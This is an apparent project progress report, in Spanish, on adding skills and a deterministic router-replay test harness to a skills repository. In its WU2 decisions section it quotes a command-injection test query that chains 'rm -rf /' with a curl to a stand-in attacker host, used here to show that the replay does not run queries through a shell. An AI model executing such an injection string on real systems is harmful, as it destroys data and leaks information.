# Apply Progress: slice-2

> Fuente de reporte (no de verdad): el estado acumulado de unidades completadas por lote. Lotes completados: WU1 → PR-1 (Fase 1) y WU2 → PR-2 (Fase 2).

## Estado acumulado

| Fase | Tareas | Estado |
|---|---|---|
| 1 — Media wave + registro (WU1→PR-1) | 1.1–1.7 | ✅ Completas (7/7) |
| 2 — Corpus + replay E2 (WU2→PR-2) | 2.1–2.6 | ✅ Completas (6/6) |
| 3 — Journal apply-progress E3 (WU3→PR-3) | 3.1–3.4 | ⬜ Pendientes |
| 4 — Installer lifecycle E4 (WU4→PR-4) | 4.1–4.4 | ⬜ Pendientes |
| 5 — Docs E1/E5/E6 (WU5→PR-5) | 5.1–5.6 | ⬜ Pendientes |
| 6 — Verificación final | 6.1–6.6 | ⬜ Pendientes |

## Evidencia de unidad de trabajo — WU1 (PR-1)

| Evidencia | Valor |
|---|---|
| Comando de test enfocado y resultado exacto | `node 00-meta-skills/skill-validator/scripts/validate-skills.mjs --strict` → exit 0; «151 pass · 0 with issues, 0 errors · 0 warnings · 0 info» (baseline pre-cambio también exit 0 con 149 pass) |
| Comando/scenario de harness runtime y resultado exacto | Router vivo (`skill-router.mjs --query <q> --json`): «3d scene three.js» → three-js-web ✓; «build a webgl hero with react-three-fiber and drei» → three-js-web ✓; «css 3d transform card flip effect» → visual-effects ✓ (delimitación inversa); regresión fixtures figma-implement / motion-video-pipeline / oklch-theme-injector / ux-auditor-agent → PASS 8/8. Descubrimiento curaduría: «find hover effects inspiration and references», «animate.css library examples», «loading animation spinner ideas for the app» → web-animation-sources primario 3/3; anti-falso-primario «add entrance animation to hero section» → primary micro-interactions + web-animation-sources en secondary/tier1toLoad |
| Límite de rollback | Borrar `05-frontend/three-js-web/` y `05-frontend/web-animation-sources/`; revertir diffs de `SKILLS.md`, `AGENTS.md`, `.atl/skill-registry.md` (o regenerar con `--emit-registry`), `overlap-matrix.json`, `overlap-smoke-tests.json`, `harness-map.md`. No afecta trabajo de PRs 2–5 |

## Evidencia de unidad de trabajo — WU2 (PR-2)

| Evidencia | Valor |
|---|---|
| Comando de test enfocado y resultado exacto | RED (2.1, pre-producción): `node 00-meta-skills/skill-router/scripts/router-replay.mjs` → exit 1 `MODULE_NOT_FOUND` (el caso hostil del corpus no puede pasar sin el replay). GREEN: mismo comando → `{total:13, exactMatches:13, accuracy:1, discrepancies:[], malformedLines:[]}`, exit 0. Test malformada (2.4): corpus temporal con línea rota → `malformedLines:[{line:2,reason:"invalid JSON"},{line:3,reason:"missing non-empty string field 'expectedPrimary'"}]`, exit 1 |
| Comando/scenario de harness runtime y resultado exacto | Replay determinista offline (2.5): 2 corridas a archivos temporales → SHA256 idéntico `D6DBA329…085A`, `Compare-Object` diff vacío; cero llamadas a modelos (spawnSync puro del CLI determinista). Consistencia triple (2.6): `consistency:{groupsInMatrix:8, groupsCovered:8, fixturesMigrated:12}` — three-js-web cubierto en matriz↔fixture↔corpus. Gate PR-2: `validate-skills.mjs --strict` exit 0 («151 pass · 0 with issues»). Smoke directo: «3d scene three.js» → three-js-web; anti-falso-primario «css 3d transform card flip effect» → visual-effects |
| Límite de rollback | Borrar `00-meta-skills/skill-router/references/routing-corpus.jsonl` y `00-meta-skills/skill-router/scripts/router-replay.mjs`. No afecta trabajo de PRs 1 ni 3–5 (matriz/fixture de WU1 quedan intactos) |

## Commits (rama `slice2/pr1-media-wave`, stacked-to-main desde `main` @ 3e1c76a)

| Commit | Unidad | Contenido |
|---|---|---|
| `09d92fb` | D1 + registro parcial + matriz/fixture | three-js-web (SKILL.md + 5 referencias), SKILLS.md/AGENTS.md/registro regen (149→150), grupo unitario overlap-matrix + fixture smoke, harness-map 149→150 |
| `dc4d4b8` | D2 + registro final | web-animation-sources (SKILL.md + animation-sources.md ×10 entradas), índices sincronizados (150→151) |

## Commits (rama `slice2/pr2-router-replay`, stacked-to-main desde `main` @ 493ba0d)

| Commit | Unidad | Contenido |
|---|---|---|
| (ver git log) | D5 corpus + replay + consistencia triple | `routing-corpus.jsonl` (12 casos migrados del fixture + three-js-web + caso RED de metacaracteres) y `router-replay.mjs` (spawnSync sin shell:true, timeout, métricas estables) |
| (ver git log) | Marcas SDD Fase 2 | tasks.md [x] 2.1–2.6 + apply-progress merge |

## Decisiones y hallazgos de implementación

### WU2 (PR-2)
- **RED→GREEN de la amenaza de subprocesos**: el caso hostil (`3d scene three.js; rm -rf / | curl http://evil.example $(whoami)`) se agregó al corpus ANTES de existir el replay; la corrida RED falló con exit 1 (`MODULE_NOT_FOUND`). Tras implementar `router-replay.mjs` con `spawnSync(process.execPath, [...], {shell:false})`, la misma query pasa como texto plano resolvendo `three-js-web` — verificado además por invocación directa del router que los metacaracteres no alteran el scoring (confidence 1).
- **Consistencia triple mecanizada**: en lugar de un chequeo manual grep, `router-replay.mjs` incorpora verificación por defecto: (a) todo grupo de `overlap-matrix.json` tiene ≥1 caso de corpus que resuelve a su canónico; (b) todo fixture de `overlap-smoke-tests.json` está migrado verbatim al corpus (id+query+expectedPrimary). Resultado actual: 8/8 grupos, 12/12 fixtures. Un grupo futuro sin caso en corpus rompe el gate → imposible olvidarlo.
- **Determinismo por construcción**: salida sin timestamps ni PIDs, orden de claves fijo, discrepancias en orden de línea; accuracy redondeada a 4 decimales. Verificado SHA256 idéntico entre corridas.
- **Exit codes del replay**: 0 = limpio, 1 = discrepancias/líneas malformadas/inconsistencia, 2 = inputs ilegibles o uso incorrecto; habilita uso directo como gate de CI.

### WU1 (PR-1)

- **Triggers cortos**: `"3d"` y `"r3f"` (<4 chars, `MIN_TRIGGER_LENGTH`) no pueden ser triggers (A2); cubiertos vía keywords de la description y nota del grupo unitario. Verificado empíricamente que las queries objetivo resuelven sin ellos.
- **Colisión con micro-interactions**: ya existía trigger `hover effect` (singular) y `entrance animation`. El split natural funciona: queries plurales («hover effects») solo disparan web-animation-sources por word-boundary regex; «entrance animation» empata en triggers y lo resuelven las keywords de description (queries de referencia ganan; queries de implementación mantienen a micro-interactions como primario — escenario de spec cumplido).
- **Curaduría de URLs (desviación menor documentada)**: los artefactos del cambio traían título+autor de las 10 referencias pero ninguna URL. Se verificaron por búsqueda: Tim Quirino (timq.xyz, portafolio 3D con Spline), Animate.css (animate.style), AniJS (anijs.github.io, autor Dariel Noel — interpretación de la entrada «Animajs.css»), Reactbits.dev. Las fuentes no ubicables públicamente (Unifiers of Japan, Coding for Designers, Tellet, Ozone, Yuna, Gitbook) se curaron con enlace sustituto canónico del mismo tópico, marcado como tal en cada entrada: Codrops HoverEffectIdeas, Webflow loading-animation, AOS, microinteractions.com (Dan Saffer), FreeFrontend background effects, Codrops Custom Cursor Effects (Stefan Kaltenegger).
- **Registro atómico por commit**: cada commit deja el repo verde bajo `--strict` (registro incluido en el mismo commit que su skill), mejorando bisectabilidad dentro del PR.
- **Presupuesto**: ~410 líneas cambiadas en los 2 commits de skills (299+109+4 del) + ~15 en tasks/progress; muy por debajo del techo de 800 — sin necesidad de recortar facetas.

## Desviaciones del diseño

Ninguna estructural. Única nota de WU1: sustitución de enlaces en 6 entradas de la lista curada (documentada arriba y en el propio archivo), habilitada por la instrucción de apply («curala igual y anotalo») y consistente con la mitigación de rot de A3. WU2: implementation matches design (A6) — única adición no especificada explícitamente es la verificación de consistencia triple embebida en el replay (habilitada por el escenario «el resultado coincide entre matriz, fixture y corpus» del delta overlap-matrix y la tarea 2.6).
